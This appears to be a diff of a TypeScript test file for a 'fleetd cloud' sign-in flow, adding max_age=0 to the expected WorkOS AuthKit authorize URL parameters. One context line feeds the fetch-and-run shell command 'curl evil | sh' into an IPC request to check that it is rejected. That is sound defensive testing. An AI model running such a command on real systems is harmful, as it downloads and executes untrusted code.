@@ -106,7 +106,7 @@ describe("signing in to fleetd cloud", () => {
     expect(parseRequest(IPC.cloudConnectComputer, ["hub", "curl evil | sh"]).ok).toBe(false);
   });
 
-  it("WorkOS's page always asks: prompt=login, so a browser already signed in to AuthKit doesn't come straight back", () => {
+  it("WorkOS's page always asks (max_age=0, prompt=login): a browser signed in to AuthKit doesn't come straight back", () => {
     const config = { accountsUrl: fake.url, clientId: fake.clientId, authorizeUrl: fake.authorizeUrl };
     const page = new URL(authorizeUrl(config, { redirect: "http://127.0.0.1:1/signin/callback", challenge: "ch", state: "st" }));
     expect(Object.fromEntries(page.searchParams)).toEqual({
@@ -115,6 +115,7 @@ describe("signing in to fleetd cloud", () => {
       response_type: "code",
       provider: "authkit",
       prompt: "login",
+      max_age: "0",
       state: "st",
       code_challenge: "ch",
       code_challenge_method: "S256",
@@ -134,6 +135,7 @@ describe("signing in to fleetd cloud", () => {
     const page = new URL(opened[0] ?? "");
     expect(page.searchParams.get("code_challenge_method")).toBe("S256");
     expect(page.searchParams.get("prompt")).toBe("login");
+    expect(page.searchParams.get("max_age")).toBe("0");
     expect(page.searchParams.get("redirect_uri")).toMatch(/^http:\/\/127\.0\.0\.1:\d+\/signin\/callback$/u);
     expect(fake.signIns[0]?.deviceName).toBe("devbox");
     expect(hubs.map((h) => [h.label, h.key])).toEqual([["sam", fake.keys[0]?.key]]);
